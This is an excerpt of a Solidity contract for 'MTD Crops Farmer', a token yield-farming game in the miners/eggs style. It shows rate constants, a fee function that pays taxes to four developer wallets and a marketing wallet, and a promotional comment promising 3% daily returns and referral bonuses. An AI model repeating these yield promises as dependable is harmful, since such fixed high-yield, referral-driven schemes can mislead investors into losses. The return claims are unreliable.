...
contract MTDCrops {
    ...
    IToken public token_MTD;
	//address erctoken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; /** Testnet **/
    address erctoken = 0x096D25018a4900cAA2271B2FF72b752E6b64BdCc; /** MTD Mainnet **/
    
    uint256 public EGGS_TO_HIRE_1MINERS = 2592000;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public REFERRAL = 80;
    uint256 public TAX = 400;
    uint256 public MARKET_EGGS_DIVISOR = 2; // 50%
    uint256 public MARKET_EGGS_DIVISOR_SELL = 1; // 100%

    uint256 public MIN_INVEST_LIMIT = 10 * 1e18; /** 10 MTD  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 100000000000 * 1e18; /** 100000000000 MTD  **/

	uint256 public COMPOUND_BONUS = 5; /** .5% **/
    ...
    function payFees(uint256 eggValue) internal returns(uint256){
        ...
        token_MTD.transfer(dev1, tax);
        token_MTD.transfer(dev2, tax);
        token_MTD.transfer(dev3, tax);
        token_MTD.transfer(dev4, tax);
        token_MTD.transfer(mkt, tax);
        return tax.mul(5);
    }
...
/**
MTD Crops Farmer
 Hire Farmers, Gather Crops, Harvest Crops and Sell for MTD. 
  3% daily daily Rate
  8% Referral Bonus, will go directly to referrer wallet.
  .5% stacking compound bonus every 24 hrs, max of 5 days. (2.5%)
  48 hours cut off time.
  10 MTD minimum investment.
  100000000000 MTD max deposits per wallet.
  80% feedback for withdrawals that will be done not after 5 consecutive compounds.(2.5%)
